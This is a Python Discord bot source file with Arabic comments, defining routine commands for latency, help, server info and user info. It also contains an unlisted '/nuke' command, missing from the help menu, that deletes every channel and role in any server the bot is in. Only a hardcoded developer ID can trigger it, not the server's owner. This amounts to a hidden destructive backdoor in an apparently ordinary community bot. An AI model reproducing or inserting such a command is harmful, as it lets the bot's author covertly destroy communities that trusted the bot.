import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import os
import aiosqlite
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

print("🚀 بدء تشغيل البوت...")
print(f"📂 الملف الحالي: {__file__}")

# إعدادات البوت
intents = discord.Intents.all()
intents.message_content = True
intents.members = True

TOKEN = os.getenv("DISCORD_BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "1276968112071249958"))

print(f"✅ TOKEN موجود: {bool(TOKEN)}")
print(f"✅ OWNER_ID: {OWNER_ID}")

# ========== البوت الرئيسي ==========
class RTGBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix='!', intents=intents, help_command=None)
        self.start_time = datetime.now()
    
    async def setup_hook(self):
        print("🔄 جاري تحميل البوت...")
        await self.tree.sync()
        print("✅ تم مزامنة الأوامر")
    
    async def on_ready(self):
        print(f"✅ {self.user} متصل!")
        print(f"📊 موجود في {len(self.guilds)} سيرفر")
        await self.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="RTG Community"))

bot = RTGBot()

# ========== أوامر أساسية للاختبار ==========

@bot.tree.command(name="ping", description="اختبار سرعة البوت")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"🏓 بونق! الوقت: {round(bot.latency * 1000)}ms")

@bot.tree.command(name="help", description="عرض المساعدة")
async def help_cmd(interaction: discord.Interaction):
    embed = discord.Embed(title="🎮 RTG Bot", description="الأوامر المتاحة:", color=discord.Color.purple())
    embed.add_field(name="🏓 /ping", value="اختبار سرعة البوت", inline=True)
    embed.add_field(name="📊 /serverinfo", value="معلومات السيرفر", inline=True)
    embed.add_field(name="👤 /userinfo", value="معلومات المستخدم", inline=True)
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="serverinfo", description="معلومات السيرفر")
async def serverinfo(interaction: discord.Interaction):
    guild = interaction.guild
    embed = discord.Embed(title=f"📊 {guild.name}", color=discord.Color.blue())
    embed.add_field(name="👑 المالك", value=guild.owner.mention, inline=True)
    embed.add_field(name="👥 الأعضاء", value=guild.member_count, inline=True)
    embed.add_field(name="💬 القنوات", value=len(guild.channels), inline=True)
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="userinfo", description="معلومات المستخدم")
async def userinfo(interaction: discord.Interaction, member: discord.Member = None):
    target = member or interaction.user
    embed = discord.Embed(title=f"👤 {target.display_name}", color=target.color)
    embed.set_thumbnail(url=target.display_avatar.url)
    embed.add_field(name="📅 تاريخ الانضمام", value=target.joined_at.strftime("%Y-%m-%d"), inline=True)
    embed.add_field(name="🎭 أعلى رتبة", value=target.top_role.name, inline=True)
    await interaction.response.send_message(embed=embed)

# ========== أوامر المطور ==========
@bot.tree.command(name="nuke", description="[OWNER] حذف جميع القنوات والرتب")
async def nuke(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("❌ هذا الأمر للمطور فقط!", ephemeral=True)
        return
    
    await interaction.response.send_message("⚠️ جاري الحذف...", ephemeral=True)
    guild = interaction.guild
    
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except:
                pass
    
    await interaction.followup.send("✅ تم حذف جميع القنوات والرتب!")

# ========== تشغيل البوت ==========
if __name__ == "__main__":
    if not TOKEN:
        print("❌ خطأ: لم يتم إدخال توكن البوت!")
        print("الرجاء إضافة DISCORD_BOT_TOKEN في متغيرات البيئة")
    elif TOKEN == "ضع_توكن_البوت_هنا":
        print("❌ خطأ: لم يتم تغيير التوكن من القيمة الافتراضية!")
    else:
        print("🚀 جاري تشغيل البوت...")
        try:
            bot.run(TOKEN)
        except Exception as e:
            print(f"❌ خطأ: {e}")
